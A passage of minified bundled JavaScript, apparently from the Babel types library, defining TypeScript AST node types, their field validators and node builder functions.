Expected ${J.length+1} quasis but got ${X.quasis.length}`)})}}});p1("TSLiteralType",{aliases:["TSType","TSBaseType"],visitor:["literal"],fields:{literal:{validate:function(){let X=(0,G1.assertNodeType)("NumericLiteral","BigIntLiteral"),Q=(0,G1.assertOneOf)("-"),J=(0,G1.assertNodeType)("NumericLiteral","StringLiteral","BooleanLiteral","BigIntLiteral","TemplateLiteral");function Y(W,G,H){if((0,Jo.default)("UnaryExpression",H))Q(H,"operator",H.operator),X(H,"argument",H.argument);else J(W,G,H)}return Y.oneOfNodeTypes=["NumericLiteral","StringLiteral","BooleanLiteral","BigIntLiteral","TemplateLiteral","UnaryExpression"],Y}()}}});p1("TSExpressionWithTypeArguments",{aliases:["TSType"],visitor:["expression","typeParameters"],fields:{expression:(0,G1.validateType)("TSEntityName"),typeParameters:(0,G1.validateOptionalType)("TSTypeParameterInstantiation")}});p1("TSInterfaceDeclaration",{aliases:["Statement","Declaration"],visitor:["id","typeParameters","extends","body"],fields:{declare:(0,G1.validateOptional)(m9),id:(0,G1.validateType)("Identifier"),typeParameters:(0,G1.validateOptionalType)("TSTypeParameterDeclaration"),extends:(0,G1.validateOptional)((0,G1.arrayOfType)("TSExpressionWithTypeArguments")),body:(0,G1.validateType)("TSInterfaceBody")}});p1("TSInterfaceBody",{visitor:["body"],fields:{body:(0,G1.validateArrayOfType)("TSTypeElement")}});p1("TSTypeAliasDeclaration",{aliases:["Statement","Declaration"],visitor:["id","typeParameters","typeAnnotation"],fields:{declare:(0,G1.validateOptional)(m9),id:(0,G1.validateType)("Identifier"),typeParameters:(0,G1.validateOptionalType)("TSTypeParameterDeclaration"),typeAnnotation:(0,G1.validateType)("TSType")}});p1("TSInstantiationExpression",{aliases:["Expression"],visitor:["expression","typeParameters"],fields:{expression:(0,G1.validateType)("Expression"),["typeParameters"]:(0,G1.validateOptionalType)("TSTypeParameterInstantiation")}});var C3={aliases:["Expression","LVal","PatternLike"],visitor:["expression","typeAnnotation"],fields:{expression:(0,G1.validateType)("Expression"),typeAnnotation:(0,G1.validateType)("TSType")}};p1("TSAsExpression",C3);p1("TSSatisfiesExpression",C3);p1("TSTypeAssertion",{aliases:["Expression","LVal","PatternLike"],visitor:["typeAnnotation","expression"],fields:{typeAnnotation:(0,G1.validateType)("TSType"),expression:(0,G1.validateType)("Expression")}});p1("TSEnumBody",{visitor:["members"],fields:{members:(0,G1.validateArrayOfType)("TSEnumMember")}});p1("TSEnumDeclaration",{aliases:["Statement","Declaration"],visitor:["id","members"],fields:{declare:(0,G1.validateOptional)(m9),const:(0,G1.validateOptional)(m9),id:(0,G1.validateType)("Identifier"),members:(0,G1.validateArrayOfType)("TSEnumMember"),initializer:(0,G1.validateOptionalType)("Expression"),body:(0,G1.validateOptionalType)("TSEnumBody")}});p1("TSEnumMember",{visitor:["id","initializer"],fields:{id:(0,G1.validateType)("Identifier","StringLiteral"),initializer:(0,G1.validateOptionalType)("Expression")}});p1("TSModuleDeclaration",{aliases:["Statement","Declaration"],visitor:["id","body"],fields:Object.assign({kind:{validate:(0,G1.assertOneOf)("global","module","namespace")},declare:(0,G1.validateOptional)(m9)},{global:(0,G1.validateOptional)(m9)},{id:(0,G1.validateType)("Identifier","StringLiteral"),body:(0,G1.validateType)("TSModuleBlock","TSModuleDeclaration")})});p1("TSModuleBlock",{aliases:["Scopable","Block","BlockParent","FunctionParent"],visitor:["body"],fields:{body:(0,G1.validateArrayOfType)("Statement")}});p1("TSImportType",{aliases:["TSType"],builder:["argument","qualifier","typeParameters"],visitor:["argument","options","qualifier","typeParameters"],fields:{argument:(0,G1.validateType)("StringLiteral"),qualifier:(0,G1.validateOptionalType)("TSEntityName"),["typeParameters"]:(0,G1.validateOptionalType)("TSTypeParameterInstantiation"),options:{validate:(0,G1.assertNodeType)("ObjectExpression"),optional:!0}}});p1("TSImportEqualsDeclaration",{aliases:["Statement","Declaration"],visitor:["id","moduleReference"],fields:Object.assign({},{isExport:(0,G1.validate)(m9)},{id:(0,G1.validateType)("Identifier"),moduleReference:(0,G1.validateType)("TSEntityName","TSExternalModuleReference"),importKind:{validate:(0,G1.assertOneOf)("type","value"),optional:!0}})});p1("TSExternalModuleReference",{visitor:["expression"],fields:{expression:(0,G1.validateType)("StringLiteral")}});p1("TSNonNullExpression",{aliases:["Expression","LVal","PatternLike"],visitor:["expression"],fields:{expression:(0,G1.validateType)("Expression")}});p1("TSExportAssignment",{aliases:["Statement"],visitor:["expression"],fields:{expression:(0,G1.validateType)("Expression")}});p1("TSNamespaceExportDeclaration",{aliases:["Statement"],visitor:["id"],fields:{id:(0,G1.validateType)("Identifier")}});p1("TSTypeAnnotation",{visitor:["typeAnnotation"],fields:{typeAnnotation:{validate:(0,G1.assertNodeType)("TSType")}}});p1("TSTypeParameterInstantiation",{visitor:["params"],fields:{params:(0,G1.validateArrayOfType)("TSType")}});p1("TSTypeParameterDeclaration",{visitor:["params"],fields:{params:(0,G1.validateArrayOfType)("TSTypeParameter")}});p1("TSTypeParameter",{builder:["constraint","default","name"],visitor:["constraint","default"],fields:{name:{validate:(0,G1.assertValueType)("string")},in:{validate:(0,G1.assertValueType)("boolean"),optional:!0},out:{validate:(0,G1.assertValueType)("boolean"),optional:!0},const:{validate:(0,G1.assertValueType)("boolean"),optional:!0},constraint:{validate:(0,G1.assertNodeType)("TSType"),optional:!0},default:{validate:(0,G1.assertNodeType)("TSType"),optional:!0}}})});var T3=m((S3)=>{Object.defineProperty(S3,"__esModule",{value:!0});S3.DEPRECATED_ALIASES=void 0;var d60=S3.DEPRECATED_ALIASES={ModuleDeclaration:"ImportOrExportDeclaration"}});var G6=m((n9)=>{Object.defineProperty(n9,"__esModule",{value:!0});Object.defineProperty(n9,"ALIAS_KEYS",{enumerable:!0,get:function(){return u9.ALIAS_KEYS}});Object.defineProperty(n9,"BUILDER_KEYS",{enumerable:!0,get:function(){return u9.BUILDER_KEYS}});Object.defineProperty(n9,"DEPRECATED_ALIASES",{enumerable:!0,get:function(){return $$.DEPRECATED_ALIASES}});Object.defineProperty(n9,"DEPRECATED_KEYS",{enumerable:!0,get:function(){return u9.DEPRECATED_KEYS}});Object.defineProperty(n9,"FLIPPED_ALIAS_KEYS",{enumerable:!0,get:function(){return u9.FLIPPED_ALIAS_KEYS}});Object.defineProperty(n9,"NODE_FIELDS",{enumerable:!0,get:function(){return u9.NODE_FIELDS}});Object.defineProperty(n9,"NODE_PARENT_VALIDATIONS",{enumerable:!0,get:function(){return u9.NODE_PARENT_VALIDATIONS}});Object.defineProperty(n9,"PLACEHOLDERS",{enumerable:!0,get:function(){return z$.PLACEHOLDERS}});Object.defineProperty(n9,"PLACEHOLDERS_ALIAS",{enumerable:!0,get:function(){return z$.PLACEHOLDERS_ALIAS}});Object.defineProperty(n9,"PLACEHOLDERS_FLIPPED_ALIAS",{enumerable:!0,get:function(){return z$.PLACEHOLDERS_FLIPPED_ALIAS}});n9.TYPES=void 0;Object.defineProperty(n9,"VISITOR_KEYS",{enumerable:!0,get:function(){return u9.VISITOR_KEYS}});g4();Z3();M3();O3();A3();P3();var u9=o6(),z$=G$(),$$=T3();Object.keys($$.DEPRECATED_ALIASES).forEach((X)=>{u9.FLIPPED_ALIAS_KEYS[X]=u9.FLIPPED_ALIAS_KEYS[$$.DEPRECATED_ALIASES[X]]});for(let{types:X,set:Q}of u9.allExpandedTypes)for(let J of X){let Y=u9.FLIPPED_ALIAS_KEYS[J];if(Y)Y.forEach(Q.add,Q);else Q.add(J)}var r60=n9.TYPES=[].concat(Object.keys(u9.VISITOR_KEYS),Object.keys(u9.FLIPPED_ALIAS_KEYS),Object.keys(u9.DEPRECATED_KEYS))});var zY=m((v3)=>{Object.defineProperty(v3,"__esModule",{value:!0});v3.default=Wo;v3.validateChild=b3;v3.validateField=k3;v3.validateInternal=Go;var m4=G6();function Wo(X,Q,J){if(!X)return;let Y=m4.NODE_FIELDS[X.type];if(!Y)return;let W=Y[Q];k3(X,Q,J,W),b3(X,Q,J)}function Go(X,Q,J,Y,W){if(!(X!=null&&X.validate))return;if(X.optional&&Y==null)return;if(X.validate(Q,J,Y),W){var G;let H=Y.type;if(H==null)return;(G=m4.NODE_PARENT_VALIDATIONS[H])==null||G.call(m4.NODE_PARENT_VALIDATIONS,Q,J,Y)}}function k3(X,Q,J,Y){if(!(Y!=null&&Y.validate))return;if(Y.optional&&J==null)return;Y.validate(X,Q,J)}function b3(X,Q,J){var Y;let W=J==null?void 0:J.type;if(W==null)return;(Y=m4.NODE_PARENT_VALIDATIONS[W])==null||Y.call(m4.NODE_PARENT_VALIDATIONS,X,Q,J)}});var U$=m((g3)=>{Object.defineProperty(g3,"__esModule",{value:!0});g3.anyTypeAnnotation=ps;g3.argumentPlaceholder=Ae;g3.arrayExpression=qo;g3.arrayPattern=Us;g3.arrayTypeAnnotation=ds;g3.arrowFunctionExpression=Ks;g3.assignmentExpression=Zo;g3.assignmentPattern=zs;g3.awaitExpression=ks;g3.bigIntLiteral=Bo;g3.binaryExpression=Mo;g3.bindExpression=Re;g3.blockStatement=Ao;g3.booleanLiteral=go;g3.booleanLiteralTypeAnnotation=rs;g3.booleanTypeAnnotation=is;g3.breakStatement=Ro;g3.callExpression=Lo;g3.catchClause=Do;g3.classAccessorProperty=ys;g3.classBody=Vs;g3.classDeclaration=qs;g3.classExpression=Bs;g3.classImplements=as;g3.classMethod=Is;g3.classPrivateMethod=ms;g3.classPrivateProperty=gs;g3.classProperty=hs;g3.conditionalExpression=No;g3.continueStatement=wo;g3.debuggerStatement=Io;g3.decimalLiteral=Ce;g3.declareClass=os;g3.declareExportAllDeclaration=Gt;g3.declareExportDeclaration=Wt;g3.declareFunction=ss;g3.declareInterface=ts;g3.declareModule=es;g3.declareModuleExports=Xt;g3.declareOpaqueType=Jt;g3.declareTypeAlias=Qt;g3.declareVariable=Yt;g3.declaredPredicate=Ht;g3.decorator=Le;g3.directive=Fo;g3.directiveLiteral=Oo;g3.doExpression=De;g3.doWhileStatement=Co;g3.emptyStatement=Po;g3.emptyTypeAnnotation=Ft;g3.enumBooleanBody=dt;g3.enumBooleanMember=at;g3.enumDeclaration=pt;g3.enumDefaultedMember=tt;g3.enumNumberBody=it;g3.enumNumberMember=ot;g3.enumStringBody=rt;g3.enumStringMember=st;g3.enumSymbolBody=nt;g3.existsTypeAnnotation=$t;g3.exportAllDeclaration=Zs;g3.exportDefaultDeclaration=Ms;g3.exportDefaultSpecifier=Ne;g3.exportNamedDeclaration=js;g3.exportNamespaceSpecifier=vs;g3.exportSpecifier=Fs;g3.expressionStatement=So;g3.file=Eo;g3.forInStatement=To;g3.forOfStatement=Os;g3.forStatement=_o;g3.functionDeclaration=ko;g3.functionExpression=bo;g3.functionTypeAnnotation=zt;g3.functionTypeParam=Ut;g3.genericTypeAnnotation=Kt;g3.identifier=vo;g3.ifStatement=xo;g3.import=bs;g3.importAttribute=ls;g3.importDeclaration=As;g3.importDefaultSpecifier=Rs;g3.importExpression=Ns;g3.importNamespaceSpecifier=Ls;g3.importSpecifier=Ds;g3.indexedAccessType=et;g3.inferredPredicate=Vt;g3.interfaceDeclaration=qt;g3.interfaceExtends=Bt;g3.interfaceTypeAnnotation=Zt;g3.interpreterDirective=jo;g3.intersectionTypeAnnotation=Mt;g3.jSXAttribute=g3.jsxAttribute=Qe;g3.jSXClosingElement=g3.jsxClosingElement=Je;g3.jSXClosingFragment=g3.jsxClosingFragment=Me;g3.jSXElement=g3.jsxElement=Ye;g3.jSXEmptyExpression=g3.jsxEmptyExpression=We;g3.jSXExpressionContainer=g3.jsxExpressionContainer=Ge;g3.jSXFragment=g3.jsxFragment=qe;g3.jSXIdentifier=g3.jsxIdentifier=$e;g3.jSXMemberExpression=g3.jsxMemberExpression=ze;g3.jSXNamespacedName=g3.jsxNamespacedName=Ue;g3.jSXOpeningElement=g3.jsxOpeningElement=Ke;g3.jSXOpeningFragment=g3.jsxOpeningFragment=Ze;g3.jSXSpreadAttribute=g3.jsxSpreadAttribute=Ve;g3.jSXSpreadChild=g3.jsxSpreadChild=He;g3.jSXText=g3.jsxText=Be;g3.labeledStatement=fo;g3.logicalExpression=mo;g3.memberExpression=uo;g3.metaProperty=ws;g3.mixedTypeAnnotation=jt;g3.moduleExpression=Pe;g3.newExpression=co;g3.noop=je;g3.nullLiteral=yo;g3.nullLiteralTypeAnnotation=ns;g3.nullableTypeAnnotation=Ot;g3.numberLiteral=i11;g3.numberLiteralTypeAnnotation=At;g3.numberTypeAnnotation=Rt;g3.numericLiteral=x3;g3.objectExpression=po;g3.objectMethod=io;g3.objectPattern=Cs;g3.objectProperty=ro;g3.objectTypeAnnotation=Lt;g3.objectTypeCallProperty=Nt;g3.objectTypeIndexer=wt;g3.objectTypeInternalSlot=Dt;g3.objectTypeProperty=It;g3.objectTypeSpreadProperty=Ct;g3.opaqueType=Pt;g3.optionalCallExpression=fs;g3.optionalIndexedAccessType=Xe;g3.optionalMemberExpression=xs;g3.parenthesizedExpression=oo;g3.pipelineBareFunction=Te;g3.pipelinePrimaryTopicReference=_e;g3.pipelineTopicExpression=Ee;g3.placeholder=Fe;g3.privateName=us;g3.program=lo;g3.qualifiedTypeIdentifier=St;g3.recordExpression=we;g3.regExpLiteral=f3;g3.regexLiteral=r11;g3.restElement=h3;g3.restProperty=n11;g3.returnStatement=no;g3.sequenceExpression=ao;g3.spreadElement=y3;g3.spreadProperty=a11;g3.staticBlock=cs;g3.stringLiteral=ho;g3.stringLiteralTypeAnnotation=Et;g3.stringTypeAnnotation=Tt;g3.super=Ps;g3.switchCase=so;g3.switchStatement=to;g3.symbolTypeAnnotation=_t;g3.taggedTemplateExpression=Ss;g3.templateElement=Es;g3.templateLiteral=Ts;g3.thisExpression=eo;g3.thisTypeAnnotation=kt;g3.throwStatement=Xs;g3.topicReference=Se;g3.tryStatement=Qs;g3.tSAnyKeyword=g3.tsAnyKeyword=ce;g3.tSArrayType=g3.tsArrayType=z11;g3.tSAsExpression=g3.tsAsExpression=S11;g3.tSBigIntKeyword=g3.tsBigIntKeyword=pe;g3.tSBooleanKeyword=g3.tsBooleanKeyword=le;g3.tSCallSignatureDeclaration=g3.tsCallSignatureDeclaration=he;g3.tSConditionalType=g3.tsConditionalType=M11;g3.tSConstructSignatureDeclaration=g3.tsConstructSignatureDeclaration=ye;g3.tSConstructorType=g3.tsConstructorType=Y11;g3.tSDeclareFunction=g3.tsDeclareFunction=ve;g3.tSDeclareMethod=g3.tsDeclareMethod=xe;g3.tSEnumBody=g3.tsEnumBody=_11;g3.tSEnumDeclaration=g3.tsEnumDeclaration=k11;g3.tSEnumMember=g3.tsEnumMember=b11;g3.tSExportAssignment=g3.tsExportAssignment=m11;g3.tSExpressionWithTypeArguments=g3.tsExpressionWithTypeArguments=N11;g3.tSExternalModuleReference=g3.tsExternalModuleReference=y11;g3.tSFunctionType=g3.tsFunctionType=J11;g3.tSImportEqualsDeclaration=g3.tsImportEqualsDeclaration=h11;g3.tSImportType=g3.tsImportType=f11;g3.tSIndexSignature=g3.tsIndexSignature=ue;g3.tSIndexedAccessType=g3.tsIndexedAccessType=A11;g3.tSInferType=g3.tsInferType=j11;g3.tSInstantiationExpression=g3.tsInstantiationExpression=P11;g3.tSInterfaceBody=g3.tsInterfaceBody=I11;g3.tSInterfaceDeclaration=g3.tsInterfaceDeclaration=w11;g3.tSIntersectionType=g3.tsIntersectionType=Z11;g3.tSIntrinsicKeyword=g3.tsIntrinsicKeyword=de;g3.tSLiteralType=g3.tsLiteralType=D11;g3.tSMappedType=g3.tsMappedType=R11;g3.tSMethodSignature=g3.tsMethodSignature=me;g3.tSModuleBlock=g3.tsModuleBlock=x11;g3.tSModuleDeclaration=g3.tsModuleDeclaration=v11;g3.tSNamedTupleMember=g3.tsNamedTupleMember=B11;g3.tSNamespaceExportDeclaration=g3.tsNamespaceExportDeclaration=u11;g3.tSNeverKeyword=g3.tsNeverKeyword=ie;g3.tSNonNullExpression=g3.tsNonNullExpression=g11;g3.tSNullKeyword=g3.tsNullKeyword=re;g3.tSNumberKeyword=g3.tsNumberKeyword=ne;g3.tSObjectKeyword=g3.tsObjectKeyword=ae;g3.tSOptionalType=g3.tsOptionalType=K11;g3.tSParameterProperty=g3.tsParameterProperty=be;g3.tSParenthesizedType=g3.tsParenthesizedType=F11;g3.tSPropertySignature=g3.tsPropertySignature=ge;g3.tSQualifiedName=g3.tsQualifiedName=fe;g3.tSRestType=g3.tsRestType=V11;g3.tSSatisfiesExpression=g3.tsSatisfiesExpression=E11;g3.tSStringKeyword=g3.tsStringKeyword=oe;g3.tSSymbolKeyword=g3.tsSymbolKeyword=se;g3.tSTemplateLiteralType=g3.tsTemplateLiteralType=L11;g3.tSThisType=g3.tsThisType=Q11;g3.tSTupleType=g3.tsTupleType=U11;g3.tSTypeAliasDeclaration=g3.tsTypeAliasDeclaration=C11;g3.tSTypeAnnotation=g3.tsTypeAnnotation=c11;g3.tSTypeAssertion=g3.tsTypeAssertion=T11;g3.tSTypeLiteral=g3.tsTypeLiteral=$11;g3.tSTypeOperator=g3.tsTypeOperator=O11;g3.tSTypeParameter=g3.tsTypeParameter=d11;g3.tSTypeParameterDeclaration=g3.tsTypeParameterDeclaration=p11;g3.tSTypeParameterInstantiation=g3.tsTypeParameterInstantiation=l11;g3.tSTypePredicate=g3.tsTypePredicate=G11;g3.tSTypeQuery=g3.tsTypeQuery=H11;g3.tSTypeReference=g3.tsTypeReference=W11;g3.tSUndefinedKeyword=g3.tsUndefinedKeyword=te;g3.tSUnionType=g3.tsUnionType=q11;g3.tSUnknownKeyword=g3.tsUnknownKeyword=ee;g3.tSVoidKeyword=g3.tsVoidKeyword=X11;g3.tupleExpression=Ie;g3.tupleTypeAnnotation=bt;g3.typeAlias=xt;g3.typeAnnotation=ft;g3.typeCastExpression=ht;g3.typeParameter=yt;g3.typeParameterDeclaration=gt;g3.typeParameterInstantiation=mt;g3.typeofTypeAnnotation=vt;g3.unaryExpression=Js;g3.unionTypeAnnotation=ut;g3.updateExpression=Ys;g3.v8IntrinsicIdentifier=Oe;g3.variableDeclaration=Ws;g3.variableDeclarator=Gs;g3.variance=ct;g3.voidPattern=ke;g3.voidTypeAnnotation=lt;g3.whileStatement=Hs;g3.withStatement=$s;g3.yieldExpression=_s;var Ko=zY(),BY=G5(),Vo=o6(),{validateInternal:D}=Ko,{NODE_FIELDS:f}=Vo;function Bo(X){if(typeof X==="bigint")X=X.toString();let Q={type:"BigIntLiteral",value:X},J=f.BigIntLiteral;return D(J.value,Q,"value",X),Q}function qo(X=[]){let Q={type:"ArrayExpression",elements:X},J=f.ArrayExpression;return D(J.elements,Q,"elements",X,1),Q}function Zo(X,Q,J){let Y={type:"AssignmentExpression",operator:X,left:Q,right:J},W=f.AssignmentExpression;return D(W.operator,Y,"operator",X),D(W.left,Y,"left",Q,1),D(W.right,Y,"right",J,1),Y}function Mo(X,Q,J){let Y={type:"BinaryExpression",operator:X,left:Q,right:J},W=f.BinaryExpression;return D(W.operator,Y,"operator",X),D(W.left,Y,"left",Q,1),D(W.right,Y,"right",J,1),Y}function jo(X){let Q={type:"InterpreterDirective",value:X},J=f.InterpreterDirective;return D(J.value,Q,"value",X),Q}function Fo(X){let Q={type:"Directive",value:X},J=f.Directive;return D(J.value,Q,"value",X,1),Q}function Oo(X){let Q={type:"DirectiveLiteral",value:X},J=f.DirectiveLiteral;return D(J.value,Q,"value",X),Q}function Ao(X,Q=[]){let J={type:"BlockStatement",body:X,directives:Q},Y=f.BlockStatement;return D(Y.body,J,"body",X,1),D(Y.directives,J,"directives",Q,1),J}function Ro(X=null){let Q={type:"BreakStatement",label:X},J=f.BreakStatement;return D(J.label,Q,"label",X,1),Q}function Lo(X,Q){let J={type:"CallExpression",callee:X,arguments:Q},Y=f.CallExpression;return D(Y.callee,J,"callee",X,1),D(Y.arguments,J,"arguments",Q,1),J}function Do(X=null,Q){let J={type:"CatchClause",param:X,body:Q},Y=f.CatchClause;return D(Y.param,J,"param",X,1),D(Y.body,J,"body",Q,1),J}function No(X,Q,J){let Y={type:"ConditionalExpression",test:X,consequent:Q,alternate:J},W=f.ConditionalExpression;return D(W.test,Y,"test",X,1),D(W.consequent,Y,"consequent",Q,1),D(W.alternate,Y,"alternate",J,1),Y}function wo(X=null){let Q={type:"ContinueStatement",label:X},J=f.ContinueStatement;return D(J.label,Q,"label",X,1),Q}function Io(){return{type:"DebuggerStatement"}}function Co(X,Q){let J={type:"DoWhileStatement",test:X,body:Q},Y=f.DoWhileStatement;return D(Y.test,J,"test",X,1),D(Y.body,J,"body",Q,1),J}function Po(){return{type:"EmptyStatement"}}function So(X){let Q={type:"ExpressionStatement",expression:X},J=f.ExpressionStatement;return D(J.expression,Q,"expression",X,1),Q}function Eo(X,Q=null,J=null){let Y={type:"File",program:X,comments:Q,tokens:J},W=f.File;return D(W.program,Y,"program",X,1),D(W.comments,Y,"comments",Q,1),D(W.tokens,Y,"tokens",J),Y}function To(X,Q,J){let Y={type:"ForInStatement",left:X,right:Q,body:J},W=f.ForInStatement;return D(W.left,Y,"left",X,1),D(W.right,Y,"right",Q,1),D(W.body,Y,"body",J,1),Y}function _o(X=null,Q=null,J=null,Y){let W={type:"ForStatement",init:X,test:Q,update:J,body:Y},G=f.ForStatement;return D(G.init,W,"init",X,1),D(G.test,W,"test",Q,1),D(G.update,W,"update",J,1),D(G.body,W,"body",Y,1),W}function ko(X=null,Q,J,Y=!1,W=!1){let G={type:"FunctionDeclaration",id:X,params:Q,body:J,generator:Y,async:W},H=f.FunctionDeclaration;return D(H.id,G,"id",X,1),D(H.params,G,"params",Q,1),D(H.body,G,"body",J,1),D(H.generator,G,"generator",Y),D(H.async,G,"async",W),G}function bo(X=null,Q,J,Y=!1,W=!1){let G={type:"FunctionExpression",id:X,params:Q,body:J,generator:Y,async:W},H=f.FunctionExpression;return D(H.id,G,"id",X,1),D(H.params,G,"params",Q,1),D(H.body,G,"body",J,1),D(H.generator,G,"generator",Y),D(H.async,G,"async",W),G}function vo(X){let Q={type:"Identifier",name:X},J=f.Identifier;return D(J.name,Q,"name",X),Q}function xo(X,Q,J=null){let Y={type:"IfStatement",test:X,consequent:Q,alternate:J},W=f.IfStatement;return D(W.test,Y,"test",X,1),D(W.consequent,Y,"consequent",Q,1),D(W.alternate,Y,"alternate",J,1),Y}function fo(X,Q){let J={type:"LabeledStatement",label:X,body:Q},Y=f.LabeledStatement;return D(Y.label,J,"label",X,1),D(Y.body,J,"body",Q,1),J}function ho(X){let Q={type:"StringLiteral",value:X},J=f.StringLiteral;return D(J.value,Q,"value",X),Q}function x3(X){let Q={type:"NumericLiteral",value:X},J=f.NumericLiteral;return D(J.value,Q,"value",X),Q}function yo(){return{type:"NullLiteral"}}function go(X){let Q={type:"BooleanLiteral",value:X},J=f.BooleanLiteral;return D(J.value,Q,"value",X),Q}function f3(X,Q=""){let J={type:"RegExpLiteral",pattern:X,flags:Q},Y=f.RegExpLiteral;return D(Y.pattern,J,"pattern",X),D(Y.flags,J,"flags",Q),J}function mo(X,Q,J){let Y={type:"LogicalExpression",operator:X,left:Q,right:J},W=f.LogicalExpression;return D(W.operator,Y,"operator",X),D(W.left,Y,"left",Q,1),D(W.right,Y,"right",J,1),Y}function uo(X,Q,J=!1,Y=null){let W={type:"MemberExpression",object:X,property:Q,computed:J,optional:Y},G=f.MemberExpression;return D(G.object,W,"object",X,1),D(G.property,W,"property",Q,1),D(G.computed,W,"computed",J),D(G.optional,W,"optional",Y),W}function co(X,Q){let J={type:"NewExpression",callee:X,arguments:Q},Y=f.NewExpression;return D(Y.callee,J,"callee",X,1),D(Y.arguments,J,"arguments",Q,1),J}function lo(X,Q=[],J="script",Y=null){let W={type:"Program",body:X,directives:Q,sourceType:J,interpreter:Y},G=f.Program;return D(G.body,W,"body",X,1),D(G.directives,W,"directives",Q,1),D(G.sourceType,W,"sourceType",J),D(G.interpreter,W,"interpreter",Y,1),W}function po(X){let Q={type:"ObjectExpression",properties:X},J=f.ObjectExpression;return D(J.properties,Q,"properties",X,1),Q}function io(X="method",Q,J,Y,W=!1,G=!1,H=!1){let $={type:"ObjectMethod",kind:X,key:Q,params:J,body:Y,computed:W,generator:G,async:H},z=f.ObjectMethod;return D(z.kind,$,"kind",X),D(z.key,$,"key",Q,1),D(z.params,$,"params",J,1),D(z.body,$,"body",Y,1),D(z.computed,$,"computed",W),D(z.generator,$,"generator",G),D(z.async,$,"async",H),$}function ro(X,Q,J=!1,Y=!1,W=null){let G={type:"ObjectProperty",key:X,value:Q,computed:J,shorthand:Y,decorators:W},H=f.ObjectProperty;return D(H.key,G,"key",X,1),D(H.value,G,"value",Q,1),D(H.computed,G,"computed",J),D(H.shorthand,G,"shorthand",Y),D(H.decorators,G,"decorators",W,1),G}function h3(X){let Q={type:"RestElement",argument:X},J=f.RestElement;return D(J.argument,Q,"argument",X,1),Q}function no(X=null){let Q={type:"ReturnStatement",argument:X},J=f.ReturnStatement;return D(J.argument,Q,"argument",X,1),Q}function ao(X){let Q={type:"SequenceExpression",expressions:X},J=f.SequenceExpression;return D(J.expressions,Q,"expressions",X,1),Q}function oo(X){let Q={type:"ParenthesizedExpression",expression:X},J=f.ParenthesizedExpression;return D(J.expression,Q,"expression",X,1),Q}function so(X=null,Q){let J={type:"SwitchCase",test:X,consequent:Q},Y=f.SwitchCase;return D(Y.test,J,"test",X,1),D(Y.consequent,J,"consequent",Q,1),J}function to(X,Q){let J={type:"SwitchStatement",discriminant:X,cases:Q},Y=f.SwitchStatement;return D(Y.discriminant,J,"discriminant",X,1),D(Y.cases,J,"cases",Q,1),J}function eo(){return{type:"ThisExpression"}}function Xs(X){let Q={type:"ThrowStatement",argument:X},J=f.ThrowStatement;return D(J.argument,Q,"argument",X,1),Q}function Qs(X,Q=null,J=null){let Y={type:"TryStatement",block:X,handler:Q,finalizer:J},W=f.TryStatement;return D(W.block,Y,"block",X,1),D(W.handler,Y,"handler",Q,1),D(W.finalizer,Y,"finalizer",J,1),Y}function Js(X,Q,J=!0){let Y={type:"UnaryExpression",operator:X,argument:Q,prefix:J},W=f.UnaryExpression;return D(W.operator,Y,"operator",X),D(W.argument,Y,"argument",Q,1),D(W.prefix,Y,"prefix",J),Y}function Ys(X,Q,J=!1){let Y={type:"UpdateExpression",operator:X,argument:Q,prefix:J},W=f.UpdateExpression;return D(W.operator,Y,"operator",X),D(W.argument,Y,"argument",Q,1),D(W.prefix,Y,"prefix",J),Y}function Ws(X,Q){let J={type:"VariableDeclaration",kind:X,declarations:Q},Y=f.VariableDeclaration;return D(Y.kind,J,"kind",X),D(Y.declarations,J,"declarations",Q,1),J}function Gs(X,Q=null){let J={type:"VariableDeclarator",id:X,init:Q},Y=f.VariableDeclarator;return D(Y.id,J,"id",X,1),D(Y.init,J,"init",Q,1),J}function Hs(X,Q){let J={type:"WhileStatement",test:X,body:Q},Y=f.WhileStatement;return D(Y.test,J,"test",X,1),D(Y.body,J,"body",Q,1),J}function $s(X,Q){let J={type:"WithStatement",object:X,body:Q},Y=f.WithStatement;return D(Y.object,J,"object",X,1),D(Y.body,J,"body",Q,1),J}function zs(X,Q){let J={type:"AssignmentPattern",left:X,right:Q},Y=f.AssignmentPattern;return D(Y.left,J,"left",X,1),D(Y.right,J,"right",Q,1),J}function Us(X){let Q={type:"ArrayPattern",elements:X},J=f.ArrayPattern;return D(J.elements,Q,"elements",X,1),Q}function Ks(X,Q,J=!1){let Y={type:"ArrowFunctionExpression",params:X,body:Q,async:J,expression:null},W=f.ArrowFunctionExpression;return D(W.params,Y,"params",X,1),D(W.body,Y,"body",Q,1),D(W.async,Y,"async",J),Y}function Vs(X){let Q={type:"ClassBody",body:X},J=f.ClassBody;return D(J.body,Q,"body",X,1),Q}function Bs(X=null,Q=null,J,Y=null){let W={type:"ClassExpression",id:X,superClass:Q,body:J,decorators:Y},G=f.ClassExpression;return D(G.id,W,"id",X,1),D(G.superClass,W,"superClass",Q,1),D(G.body,W,"body",J,1),D(G.decorators,W,"decorators",Y,1),W}function qs(X=null,Q=null,J,Y=null){let W={type:"ClassDeclaration",id:X,superClass:Q,body:J,decorators:Y},G=f.ClassDeclaration;return D(G.id,W,"id",X,1),D(G.superClass,W,"superClass",Q,1),D(G.body,W,"body",J,1),D(G.decorators,W,"decorators",Y,1),W}function Zs(X){let Q={type:"ExportAllDeclaration",source:X},J=f.ExportAllDeclaration;return D(J.source,Q,"source",X,1),Q}function Ms(X){let Q={type:"ExportDefaultDeclaration",declaration:X},J=f.ExportDefaultDeclaration;return D(J.declaration,Q,"declaration",X,1),Q}function js(X=null,Q=[],J=null){let Y={type:"ExportNamedDeclaration",declaration:X,specifiers:Q,source:J},W=f.ExportNamedDeclaration;return D(W.declaration,Y,"declaration",X,1),D(W.specifiers,Y,"specifiers",Q,1),D(W.source,Y,"source",J,1),Y}function Fs(X,Q){let J={type:"ExportSpecifier",local:X,exported:Q},Y=f.ExportSpecifier;return D(Y.local,J,"local",X,1),D(Y.exported,J,"exported",Q,1),J}function Os(X,Q,J,Y=!1){let W={type:"ForOfStatement",left:X,right:Q,body:J,await:Y},G=f.ForOfStatement;return D(G.left,W,"left",X,1),D(G.right,W,"right",Q,1),D(G.body,W,"body",J,1),D(G.await,W,"await",Y),W}function As(X,Q){let J={type:"ImportDeclaration",specifiers:X,source:Q},Y=f.ImportDeclaration;return D(Y.specifiers,J,"specifiers",X,1),D(Y.source,J,"source",Q,1),J}function Rs(X){let Q={type:"ImportDefaultSpecifier",local:X},J=f.ImportDefaultSpecifier;return D(J.local,Q,"local",X,1),Q}function Ls(X){let Q={type:"ImportNamespaceSpecifier",local:X},J=f.ImportNamespaceSpecifier;return 